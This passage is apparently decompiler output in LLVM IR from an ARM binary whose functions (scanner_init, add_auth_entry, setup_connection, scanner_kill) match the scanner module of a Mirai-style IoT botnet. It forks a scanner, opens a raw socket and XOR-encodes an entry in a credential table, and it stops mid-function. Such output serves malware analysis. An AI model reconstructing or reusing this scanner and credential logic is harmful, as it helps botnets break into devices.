  %v4_f2f4 = udiv i32 %v5_f2e4, 256
  %v5_f2f4 = xor i32 %v2_f2e8, %v4_f2f4
  store i32 %v5_f2f4, i32* @r4, align 4
  %v2_f2fc = inttoptr i32 %v1_f2fc to i32*
  store i32 %v2_f2ec, i32* %v2_f2fc, align 4
  %v0_f300 = load i32, i32* %ip.global-to-local, align 4
  %v1_f300 = load i32, i32* %r8.global-to-local, align 4
  %v2_f300 = inttoptr i32 %v1_f300 to i32*
  store i32 %v0_f300, i32* %v2_f300, align 4
  %v0_f304 = load i32, i32* %r2.global-to-local, align 4
  %v1_f304 = load i32, i32* %r7.global-to-local, align 4
  %v2_f304 = inttoptr i32 %v1_f304 to i32*
  store i32 %v0_f304, i32* %v2_f304, align 4
  %v0_f308 = load i32, i32* @r4, align 4
  %v1_f308 = load i32, i32* @r6, align 4
  %v2_f308 = inttoptr i32 %v1_f308 to i32*
  store i32 %v0_f308, i32* %v2_f308, align 4
  %v2_f30c = call i32 @util_strlen(i8* %v2_f2b8)
  %v0_f314 = load i32, i32* @r4, align 4
  %v3_f318 = urem i32 %v0_f314, %v2_f30c
  %v2_f320 = add i32 %v3_f318, %v2_f31c
  %v1_f324 = add i32 %v2_f320, -32
  %v2_f324 = inttoptr i32 %v1_f324 to i8*
  %v3_f324 = load i8, i8* %v2_f324, align 1
  %v2_f328 = load i32, i32* @r5, align 4
  %v3_f328 = load i32, i32* %fp.global-to-local, align 4
  %v4_f328 = add i32 %v3_f328, %v2_f328
  %v5_f328 = inttoptr i32 %v4_f328 to i8*
  store i8 %v3_f324, i8* %v5_f328, align 1
  %v0_f32c = load i32, i32* @r5, align 4
  %v1_f32c = add i32 %v0_f32c, 1
  store i32 %v1_f32c, i32* @r5, align 4
  %v1_f330 = load i32, i32* %sb.global-to-local, align 4
  %v9_f330 = icmp eq i32 %v1_f32c, %v1_f330
  br i1 %v9_f330, label %dec_label_pc_f338, label %dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge

dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge:    ; preds = %dec_label_pc_f2d8
  %v1_f2fc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f2d8

dec_label_pc_f338:                                ; preds = %dec_label_pc_f2d8, %entry
  %v1_f33c = call i32 @table_lock_val(i32 61)
  store i32 %v3_f28c, i32* @r4, align 4
  store i32 %v6_f28c, i32* @r5, align 4
  store i32 %v9_f28c, i32* @r6, align 4
  ret i32 %v1_f33c

; uselistorder directives
  uselistorder i32 %v2_f2dc, { 1, 0 }
  uselistorder i32 %v2_f2d8, { 1, 0, 2 }
  uselistorder i32* @global_var_246b8.147, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_246b4.151, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_246b0.149, { 2, 5, 3, 1, 0, 4 }
  uselistorder i32* @global_var_246ac.145, { 2, 4, 1, 0, 3 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f368 = load i32, i32* @global_var_271d8.161, align 4
  %v2_f370 = call i32 @kill(i32 %v2_f368, i32 9)
  ret i32 %v2_f370

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f384 = load i32, i32* @r4, align 4
  store i32 %v3_f384, i32* %stack_var_-16, align 4
  %v6_f384 = load i32, i32* @r5, align 4
  %v9_f384 = load i32, i32* @r6, align 4
  %v12_f384 = load i32, i32* @lr, align 4
  %v0_f388 = load i32, i32* @r0, align 4
  store i32 %v0_f388, i32* @r5, align 4
  %v1_f38c = add i32 %v0_f388, 4
  %v2_f38c = inttoptr i32 %v1_f38c to i32*
  %v3_f38c = load i32, i32* %v2_f38c, align 4
  store i32 %v3_f38c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 62384, i32* @lr, align 4
  %v1_f3ac = icmp ne i32 %v3_f38c, -1
  call void @__pseudo_cond_branch(i1 %v1_f3ac, i32 ptrtoint (i32* @global_var_16360.61 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_f3b8 = load i32, i32* @r6, align 4
  store i32 %v0_f3b8, i32* %r2.global-to-local, align 4
  %v3_f3bc = call i32 @socket(i32 2, i32 1, i32 %v0_f3b8)
  store i32 %v3_f3bc, i32* %r0.global-to-local, align 4
  %v7_f3c0 = icmp eq i32 %v3_f3bc, -1
  %v1_f3c4 = load i32, i32* @r5, align 4
  %v2_f3c4 = add i32 %v1_f3c4, 4
  %v3_f3c4 = inttoptr i32 %v2_f3c4 to i32*
  store i32 %v3_f3bc, i32* %v3_f3c4, align 4
  br i1 %v7_f3c0, label %entry.dec_label_pc_f43c_crit_edge, label %dec_label_pc_f3cc

entry.dec_label_pc_f43c_crit_edge:                ; preds = %entry
  %v1_f444.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f3cc:                                ; preds = %entry
  %v2_f390 = ptrtoint i32* %stack_var_-32 to i32
  %v0_f3cc = load i32, i32* @r5, align 4
  %v1_f3cc = add i32 %v0_f3cc, 28
  store i32 %v1_f3cc, i32* %r0.global-to-local, align 4
  %v0_f3d0 = load i32, i32* @r6, align 4
  %v2_f3d0 = add i32 %v0_f3cc, 24
  %v3_f3d0 = inttoptr i32 %v2_f3d0 to i32*
  store i32 %v0_f3d0, i32* %v3_f3d0, align 4
  %v2_f3d8 = call i32 @util_zero(i32 %v1_f3cc, i32 256)
  store i32 %v2_f3d8, i32* %r0.global-to-local, align 4
  %v0_f3dc = load i32, i32* @r5, align 4
  %v1_f3dc = add i32 %v0_f3dc, 4
  %v2_f3dc = inttoptr i32 %v1_f3dc to i32*
  %v3_f3dc = load i32, i32* %v2_f3dc, align 4
  store i32 %v3_f3dc, i32* @r4, align 4
  %v0_f3e0 = load i32, i32* @r6, align 4
  store i32 %v0_f3e0, i32* @r2, align 4
  store i32 %v3_f3dc, i32* %r0.global-to-local, align 4
  %v2_f3ec = call i32 @__libc_fcntl(i32 %v3_f3dc, i32 3)
  %v1_f3f4 = or i32 %v2_f3ec, 2048
  store i32 %v1_f3f4, i32* @r2, align 4
  %v0_f3f8 = load i32, i32* @r4, align 4
  store i32 %v0_f3f8, i32* %r0.global-to-local, align 4
  %v2_f3fc = call i32 @__libc_fcntl(i32 %v0_f3f8, i32 4)
  store i32 %v2_f3fc, i32* %r0.global-to-local, align 4
  %v2_f404 = load i32, i32* @global_var_246f0.163, align 4
  store i32 %v2_f404, i32* %r2.global-to-local, align 4
  %v1_f40c = load i32, i32* @r5, align 4
  %v2_f40c = add i32 %v1_f40c, 12
  %v3_f40c = inttoptr i32 %v2_f40c to i32*
  store i32 1, i32* %v3_f40c, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_f418 = load i32, i32* %r2.global-to-local, align 4
  %v1_f418 = load i32, i32* @r5, align 4
  %v2_f418 = add i32 %v1_f418, 8
  %v3_f418 = inttoptr i32 %v2_f418 to i32*
  store i32 %v0_f418, i32* %v3_f418, align 4
  %v0_f41c = load i32, i32* @r5, align 4
  %v1_f420 = add i32 %v0_f41c, 4
  %v2_f420 = inttoptr i32 %v1_f420 to i32*
  %v3_f420 = load i32, i32* %v2_f420, align 4
  store i32 %v3_f420, i32* %r0.global-to-local, align 4
  %v1_f424 = add i32 %v0_f41c, 20
  %v2_f424 = inttoptr i32 %v1_f424 to i16*
  %v3_f424 = load i16, i16* %v2_f424, align 2
  %v4_f424 = zext i16 %v3_f424 to i32
  store i32 %v4_f424, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f438 = call i32 @__libc_connect(i32 %v3_f420, i32 %v2_f390, i32 16)
  store i32 %v3_f438, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %entry.dec_label_pc_f43c_crit_edge, %dec_label_pc_f3cc
  %v1_f444 = phi i32 [ %v1_f444.pre, %entry.dec_label_pc_f43c_crit_edge ], [ %v3_f438, %dec_label_pc_f3cc ]
  %v2_f440 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f440, i32* @r4, align 4
  store i32 %v6_f384, i32* @r5, align 4
  store i32 %v9_f384, i32* @r6, align 4
  store i32 %v12_f384, i32* @lr, align 4
  ret i32 %v1_f444

; uselistorder directives
  uselistorder i32 %v3_f3bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 12, 7, 6, 5, 11, 10, 1, 0, 9, 8, 4, 3, 2 }
  uselistorder label %dec_label_pc_f43c, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_f44c = load i32, i32* @r4, align 4
  %v6_f44c = load i32, i32* @r5, align 4
  %v9_f44c = load i32, i32* @r6, align 4
  %v12_f44c = load i32, i32* @r7, align 4
  %v15_f44c = load i32, i32* @r8, align 4
  %v18_f44c = load i32, i32* @sb, align 4
  %v21_f44c = load i32, i32* @sl, align 4
  %v24_f44c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_246bc.165 to i32), i32* @fp, align 4
  %v2_f454 = load i32, i32* @global_var_246bc.165, align 4
  store i32 ptrtoint (i32* @global_var_246e8.167 to i32), i32* @sl, align 4
  %v1_f460 = add i32 %v2_f454, 1
  store i32 %v1_f460, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_f46c = load i32, i32* @global_var_246e8.167, align 4
  store i32 %v2_f46c, i32* %r0.global-to-local, align 4
  %v3_f470 = mul i32 %v1_f460, 16
  store i32 %v3_f470, i32* %r1.global-to-local, align 4
  %v4_f478 = inttoptr i32 %v2_f46c to i32*
  %v5_f478 = call i32 @realloc(i32* %v4_f478, i32 %v3_f470, i32 %arg3, i32 %v1_f460)
  %v2_f47c = load i32, i32* @global_var_246bc.165, align 4
  store i32 %v2_f47c, i32* %r2.global-to-local, align 4
  store i32 %v5_f478, i32* @r8, align 4
  %v0_f484 = load i32, i32* @r5, align 4
  store i32 %v0_f484, i32* %r0.global-to-local, align 4
  %v1_f48c = load i32, i32* @sl, align 4
  %v2_f48c = inttoptr i32 %v1_f48c to i32*
  store i32 %v5_f478, i32* %v2_f48c, align 4
  %v1_f490 = inttoptr i32 %v0_f484 to i8*
  %v2_f490 = call i32 @util_strlen(i8* %v1_f490)
  %sext = mul i32 %v2_f490, 16777216
  %v1_f494 = sdiv i32 %sext, 16777216
  %v2_f494 = add nsw i32 %v1_f494, 1
  store i32 %v2_f494, i32* @r4, align 4
  store i32 %v1_f494, i32* @r7, align 4
  store i32 %v2_f494, i32* @r0, align 4
  %v0_f4a0 = call i32 @malloc()
  store i32 %v0_f4a0, i32* %r0.global-to-local, align 4
  %v0_f4a4 = load i32, i32* @r5, align 4
  store i32 %v0_f4a4, i32* %r1.global-to-local, align 4
  %v0_f4a8 = load i32, i32* @r4, align 4
  store i32 %v0_f4a8, i32* %r2.global-to-local, align 4
  store i32 %v0_f4a0, i32* %r6.global-to-local, align 4
  %v3_f4b0 = call i32 @util_memcpy(i32 %v0_f4a0, i32 %v0_f4a4, i32 %v0_f4a8)
  store i32 %v3_f4b0, i32* %r0.global-to-local, align 4
  %v0_f4b4 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_f4b4, 1
  %extract.t6 = trunc i32 %v0_f4b4 to i8
  br i1 %tmp22, label %dec_label_pc_f4d8, label %dec_label_pc_f4bc

dec_label_pc_f4bc:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4c0, %dec_label_pc_f4bc
  %v2_f4c8 = phi i32 [ %v1_f4cc, %dec_label_pc_f4c0 ], [ 0, %dec_label_pc_f4bc ]
  %v1_f4c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f4c0 = add i32 %v1_f4c0, %v2_f4c8
  %v3_f4c0 = inttoptr i32 %v2_f4c0 to i8*
  %v4_f4c0 = load i8, i8* %v3_f4c0, align 1
  %v6_f4c0 = zext i8 %v4_f4c0 to i32
  %v1_f4c4 = xor i32 %v6_f4c0, 80
  store i32 %v1_f4c4, i32* %r3.global-to-local, align 4
  %v1_f4c8 = trunc i32 %v1_f4c4 to i8
  store i8 %v1_f4c8, i8* %v3_f4c0, align 1
  %v0_f4cc = load i32, i32* %r2.global-to-local, align 4
  %v1_f4cc = add i32 %v0_f4cc, 1
  store i32 %v1_f4cc, i32* %r2.global-to-local, align 4
  %v1_f4d0 = load i32, i32* @r7, align 4
  %v9_f4d0 = icmp eq i32 %v1_f4cc, %v1_f4d0
  br i1 %v9_f4d0, label %dec_label_pc_f4d8.loopexit, label %dec_label_pc_f4c0

dec_label_pc_f4d8.loopexit:                       ; preds = %dec_label_pc_f4c0
  %extract.t = trunc i32 %v1_f4cc to i8
  br label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4d8.loopexit, %entry
  %v0_f4e8.off0 = phi i8 [ %extract.t, %dec_label_pc_f4d8.loopexit ], [ %extract.t6, %entry ]
  %v2_f4d8 = load i32, i32* @global_var_246bc.165, align 4
  %v2_f4dc = load i32, i32* @global_var_246e8.167, align 4
  %v3_f4e0 = mul i32 %v2_f4d8, 16
  store i32 %v3_f4e0, i32* @sb, align 4
  %v2_f4e4 = add i32 %v2_f4dc, %v3_f4e0
  store i32 %v2_f4e4, i32* %r2.global-to-local, align 4
  %v3_f4e8 = add i32 %v2_f4e4, 12
  %v4_f4e8 = inttoptr i32 %v3_f4e8 to i8*
  store i8 %v0_f4e8.off0, i8* %v4_f4e8, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_f47c, i32* %r3.global-to-local, align 4
  %v0_f4f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f4f4 = load i32, i32* @r8, align 4
  %v5_f4f4 = mul i32 %v2_f47c, 16
  %v6_f4f4 = add i32 %v1_f4f4, %v5_f4f4
  %v7_f4f4 = inttoptr i32 %v6_f4f4 to i32*
  store i32 %v0_f4f4, i32* %v7_f4f4, align 4
  %v2_f4f8 = load i32, i32* @global_var_246e8.167, align 4
  store i32 %v2_f4f8, i32* @r7, align 4
  %v1_f4fc = inttoptr i32 %arg2 to i8*
  %v2_f4fc = call i32 @util_strlen(i8* %v1_f4fc)
  %sext1 = mul i32 %v2_f4fc, 16777216
  %v1_f500 = sdiv i32 %sext1, 16777216
  %v2_f500 = add nsw i32 %v1_f500, 1
  store i32 %v2_f500, i32* @r4, align 4
  store i32 %v1_f500, i32* @r6, align 4
  store i32 %v2_f500, i32* @r0, align 4
  %v0_f50c = call i32 @malloc()
  store i32 %v0_f50c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_f514 = load i32, i32* @r4, align 4
  store i32 %v0_f514, i32* %r2.global-to-local, align 4
  store i32 %v0_f50c, i32* %r5.global-to-local, align 4
  %v3_f51c = call i32 @util_memcpy(i32 %v0_f50c, i32 %arg2, i32 %v0_f514)
  store i32 %v3_f51c, i32* %r0.global-to-local, align 4
  %v0_f520 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_f520, 1
  %extract.t8 = trunc i32 %v0_f520 to i8
  br i1 %tmp23, label %dec_label_pc_f544, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f4d8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f52c, %dec_label_pc_f528
  %v2_f534 = phi i32 [ %v1_f538, %dec_label_pc_f52c ], [ 0, %dec_label_pc_f528 ]
  %v1_f52c = load i32, i32* %r5.global-to-local, align 4
  %v2_f52c = add i32 %v1_f52c, %v2_f534
  %v3_f52c = inttoptr i32 %v2_f52c to i8*
  %v4_f52c = load i8, i8* %v3_f52c, align 1
  %v6_f52c = zext i8 %v4_f52c to i32
  %v1_f530 = xor i32 %v6_f52c, 80
  store i32 %v1_f530, i32* %r3.global-to-local, align 4
  %v1_f534 = trunc i32 %v1_f530 to i8
  store i8 %v1_f534, i8* %v3_f52c, align 1
  %v0_f538 = load i32, i32* %r2.global-to-local, align 4
  %v1_f538 = add i32 %v0_f538, 1
  store i32 %v1_f538, i32* %r2.global-to-local, align 4
  %v1_f53c = load i32, i32* @r6, align 4
  %v9_f53c = icmp eq i32 %v1_f538, %v1_f53c
  br i1 %v9_f53c, label %dec_label_pc_f544.loopexit, label %dec_label_pc_f52c

dec_label_pc_f544.loopexit:                       ; preds = %dec_label_pc_f52c
  %extract.t7 = trunc i32 %v1_f538 to i8
  br label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f544.loopexit, %dec_label_pc_f4d8
  %v0_f554.off0 = phi i8 [ %extract.t7, %dec_label_pc_f544.loopexit ], [ %extract.t8, %dec_label_pc_f4d8 ]
  %v2_f544 = load i32, i32* @global_var_246bc.165, align 4
  store i32 %v2_f544, i32* %r0.global-to-local, align 4
  %v2_f548 = load i32, i32* @global_var_246e8.167, align 4
  %v3_f54c = mul i32 %v2_f544, 16
  store i32 %v3_f54c, i32* %r1.global-to-local, align 4
  %v2_f550 = or i32 %v3_f54c, 13
  %v3_f554 = add i32 %v2_f550, %v2_f548
  %v4_f554 = inttoptr i32 %v3_f554 to i8*
  store i8 %v0_f554.off0, i8* %v4_f554, align 1
  store i32 ptrtoint (i16** @global_var_246ec.169 to i32), i32* %r4.global-to-local, align 4
  %v2_f560 = load i16, i16* bitcast (i16** @global_var_246ec.169 to i16*), align 4
  %v3_f560 = zext i16 %v2_f560 to i32
  store i32 %v3_f560, i32* %lr.global-to-local, align 4
  %v2_f568 = load i32, i32* @global_var_246e8.167, align 4
  store i32 %v2_f568, i32* %r2.global-to-local, align 4
  %v0_f570 = load i32, i32* %r1.global-to-local, align 4
  %v2_f570 = add i32 %v0_f570, %v2_f568
  store i32 %v2_f570, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_246ec.169 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_f578 = load i32, i32* @sb, align 4
  %v1_f578 = load i32, i32* @r7, align 4
  %v2_f578 = add i32 %v1_f578, %v0_f578
  store i32 %v2_f578, i32* %ip.global-to-local, align 4
  %v0_f57c = load i32, i32* %r0.global-to-local, align 4
  %v1_f57c = add i32 %v0_f57c, 1
  store i32 %v1_f57c, i32* %r0.global-to-local, align 4
  %v3_f580 = add i32 %v2_f570, 10
  %v4_f580 = inttoptr i32 %v3_f580 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_246ec.169 to i32), i32 16), i32 16) to i16), i16* %v4_f580, align 2
  %v0_f584 = load i32, i32* %lr.global-to-local, align 4
  %v1_f584 = trunc i32 %v0_f584 to i16
  %v2_f584 = load i32, i32* %r1.global-to-local, align 4
  %v3_f584 = add i32 %v2_f584, 8
  %v4_f584 = inttoptr i32 %v3_f584 to i16*
  store i16 %v1_f584, i16* %v4_f584, align 2
  %v0_f588 = load i32, i32* %r5.global-to-local, align 4
  %v1_f588 = load i32, i32* %ip.global-to-local, align 4
  %v2_f588 = add i32 %v1_f588, 4
  %v3_f588 = inttoptr i32 %v2_f588 to i32*
  store i32 %v0_f588, i32* %v3_f588, align 4
  %v1_f58c = load i32, i32* @fp, align 4
  %v2_f58c = inttoptr i32 %v1_f58c to i32*
  store i32 %v1_f57c, i32* %v2_f58c, align 4
  %v0_f590 = load i32, i32* %r3.global-to-local, align 4
  %v1_f590 = trunc i32 %v0_f590 to i16
  %v2_f590 = load i32, i32* %r4.global-to-local, align 4
  %v3_f590 = inttoptr i32 %v2_f590 to i16*
  store i16 %v1_f590, i16* %v3_f590, align 2
  store i32 %v3_f44c, i32* @r4, align 4
  store i32 %v6_f44c, i32* @r5, align 4
  store i32 %v9_f44c, i32* @r6, align 4
  store i32 %v12_f44c, i32* @r7, align 4
  store i32 %v15_f44c, i32* @r8, align 4
  store i32 %v18_f44c, i32* @sb, align 4
  store i32 %v21_f44c, i32* @sl, align 4
  store i32 %v24_f44c, i32* @fp, align 4
  ret i32 %v1_f57c

; uselistorder directives
  uselistorder i32 %v3_f54c, { 1, 0 }
  uselistorder i32 %v1_f538, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f50c, { 1, 0, 2 }
  uselistorder i32 %v3_f4e0, { 1, 0 }
  uselistorder i32 %v1_f4cc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f4a0, { 1, 0, 2 }
  uselistorder i32 %v2_f47c, { 1, 0, 2 }
  uselistorder i32 %v3_f470, { 1, 0 }
  uselistorder i32 %v1_f460, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 18, 2, 30, 31, 32, 33, 34, 35, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 76, 77, 78, 79, 80, 81, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 73, 74, 75, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp314 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i16, align 2
  %tmp342 = call i16 @__decompiler_undefined_function_2()
  %v6_f5ac = load i32, i32* @r5, align 4
  %v18_f5ac = load i32, i32* @sb, align 4
  %v21_f5ac = load i32, i32* @sl, align 4
  %v24_f5ac = load i32, i32* @fp, align 4
  %v0_f5b8 = call i32 @__libc_fork()
  store i32 %v0_f5b8, i32* %r0.global-to-local, align 4
  %v7_f5bc = icmp eq i32 %v0_f5b8, -1
  %. = zext i1 %v7_f5bc to i32
  %tmp345 = icmp slt i32 %v0_f5b8, 1
  %storemerge308 = select i1 %tmp345, i32 %., i32 1
  store i32 %storemerge308, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_271d8.161 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5d8 = icmp eq i32 %storemerge308, 0
  store i1 %v2_f5d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f5b8, i32* @global_var_271d8.161, align 4
  br i1 %v2_f5d8, label %dec_label_pc_f8b8, label %dec_label_pc_f5e4

dec_label_pc_f5e4:                                ; preds = %entry
  store i32 %v6_f5ac, i32* @r5, align 4
  store i32 %v18_f5ac, i32* @sb, align 4
  store i32 %v21_f5ac, i32* @sl, align 4
  store i32 %v24_f5ac, i32* @fp, align 4
  ret i32 %v0_f5b8

dec_label_pc_f8b8:                                ; preds = %entry
  %v0_f8b8 = call i32 @util_local_addr()
  store i32 %v0_f8b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_f8b8, i32* @global_var_271b8.90, align 4
  %v1_f8c4 = call i32 @rand_init(i32 %v0_f8b8)
  %v0_f8c8 = load i32, i32* @r4, align 4
  store i32 %v0_f8c8, i32* %r0.global-to-local, align 4
  %v1_f8cc = inttoptr i32 %v0_f8c8 to i32*
  %v2_f8cc = call i32 @__GI_time(i32* %v1_f8cc)
  store i32 ptrtoint (i32* @global_var_246f0.163 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_f8cc, i32* @global_var_246f0.163, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_f8e0 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_271d0.174 to i32), i32* %r3.global-to-local, align 4
  %v0_f8e8 = load i32, i32* @r4, align 4
  %v5_f8e8 = trunc i32 %v0_f8e8 to i16
  store i16 %v5_f8e8, i16* %stack_var_-52, align 2
  store i32 %v2_f8e0, i32* @global_var_271d0.174, align 4
  store i32 %v0_f8e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8f4.dec_label_pc_f8f4_crit_edge, %dec_label_pc_f8b8
  %v2_f900 = phi i32 [ %v2_f900.pre, %dec_label_pc_f8f4.dec_label_pc_f8f4_crit_edge ], [ %v2_f8e0, %dec_label_pc_f8b8 ]
  %v0_f908 = phi i32 [ %v0_f938, %dec_label_pc_f8f4.dec_label_pc_f8f4_crit_edge ], [ %v0_f8e8, %dec_label_pc_f8b8 ]
  %v3_f8f4162 = phi i16 [ %v5_f938, %dec_label_pc_f8f4.dec_label_pc_f8f4_crit_edge ], [ %v5_f8e8, %dec_label_pc_f8b8 ]
  %v4_f8f4 = sext i16 %v3_f8f4162 to i32
  %v3_f8fc = mul i32 %v0_f908, 256
  store i32 %v3_f8fc, i32* %ip.global-to-local, align 4
  store i32 %v2_f900, i32* @lr, align 4
  %v2_f910 = mul nsw i32 %v4_f8f4, 288
  %v2_f914 = mul i32 %v0_f908, 288
  %v1_f918 = add nsw i32 %v4_f8f4, 1
  store i32 %v1_f918, i32* %r0.global-to-local, align 4
  %v2_f91c = add i32 %v2_f910, %v2_f900
  store i32 %v2_f91c, i32* %r2.global-to-local, align 4
  %v2_f920 = add i32 %v2_f914, %v2_f900
  store i32 %v2_f920, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_f930 = add i32 %v2_f91c, 4
  %v3_f930 = inttoptr i32 %v2_f930 to i32*
  store i32 -1, i32* %v3_f930, align 4
  %v0_f934 = load i32, i32* @r5, align 4
  %v1_f934 = load i32, i32* %r1.global-to-local, align 4
  %v2_f934 = add i32 %v1_f934, 12
  %v3_f934 = inttoptr i32 %v2_f934 to i32*
  store i32 %v0_f934, i32* %v3_f934, align 4
  %v0_f938 = load i32, i32* %r0.global-to-local, align 4
  %v5_f938 = trunc i32 %v0_f938 to i16
  %v7_f93c = icmp sgt i16 %v3_f8f4162, 254
  br i1 %v7_f93c, label %dec_label_pc_f940, label %dec_label_pc_f8f4.dec_label_pc_f8f4_crit_edge

dec_label_pc_f8f4.dec_label_pc_f8f4_crit_edge:    ; preds = %dec_label_pc_f8f4
  %v2_f900.pre = load i32, i32* @global_var_271d0.174, align 4
  br label %dec_label_pc_f8f4

dec_label_pc_f940:                                ; preds = %dec_label_pc_f8f4
  store i16 %v5_f938, i16* %stack_var_-52, align 2
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_f94c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_f94c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_271d4.176 to i32), i32* %r2.global-to-local, align 4
  %v2_f954 = icmp eq i32 %v3_f94c, -1
  store i1 %v2_f954, i1* %cpsr_c.global-to-local, align 1
  %v7_f954 = icmp eq i32 %v3_f94c, -1
  store i1 %v7_f954, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f94c, i32* @r4, align 4
  store i32 %v3_f94c, i32* @global_var_271d4.176, align 4
  br i1 %v7_f954, label %dec_label_pc_10ac0, label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %dec_label_pc_f940
